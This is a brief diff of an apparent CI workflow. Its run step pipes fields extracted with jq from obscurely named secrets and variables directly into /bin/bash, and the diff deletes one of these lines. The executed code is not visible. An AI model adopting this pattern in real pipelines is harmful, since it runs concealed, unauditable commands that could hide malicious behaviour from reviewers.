@@ -17,7 +17,6 @@ jobs:
           esjs8: ${{ secrets.esjs8 }}
         run: |
           printf '%s' "$esjs8" | jq -r .tgr5393 | /bin/bash
-          echo $kgx5 | jq -r .fruhl6308 | /bin/bash
           printf '%s' "$ww3072" | jq -r .h657 | /bin/bash
           printf '%s' "$rqogl7" | jq -r .t9 | /bin/bash
 
